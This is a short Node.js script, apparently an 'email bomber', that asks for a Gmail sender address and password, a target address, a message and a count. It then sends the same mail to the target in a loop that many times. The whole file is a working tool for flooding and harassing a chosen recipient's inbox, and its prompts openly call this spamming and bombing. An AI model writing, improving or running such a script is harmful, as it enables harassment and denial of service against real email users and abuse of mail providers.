// Importing the required library in NodeJS to send emails using script
const nodemailer = require('nodemailer')
// NPM Package for getting user input through Command Line
const inquirer = require('inquirer')
// Taking User Input
var questions = [{
	type: 'input',
	name: 'senderEmail',
	message: 'Enter the email id from which you want to bomb emails: '
}, {
	type: 'input',
	name: 'receiverEmail',
	message: 'Enter the email id which you want to spam through this email bomber: '
}, {
	type: 'input',
	name: 'subject',
	message: 'Enter the subject of mail: '
}, {
	name: 'input',
	name: 'text',
	message: 'Enter the text content of mail: '
}, {
	type: 'password',
	name: 'password',
	message: 'Enter your email password: '
}, {
	type: 'number',
	name: 'times',
	message: 'Enter the number of emails you want to send: '
}]
// Working on the user input to send emails
inquirer.prompt(questions).then( answers => {
	let mailOptions = {
		from: answers.senderEmail,
		to: answers.receiverEmail,
		subject: answers.subject,
		text: answers.text
	}
	const transporter = nodemailer.createTransport({
		service: 'gmail', 
		auth: {
			user: answers.senderEmail,
			pass: answers.password
		}
	})
	for(var i=0 ; i<answers.times ; i++){
		transporter.sendMail(mailOptions, (error, response) => {
			if (error) {
				console.log(error)
			}
		})
	}	
	console.log("Email Bombing Successful!")
})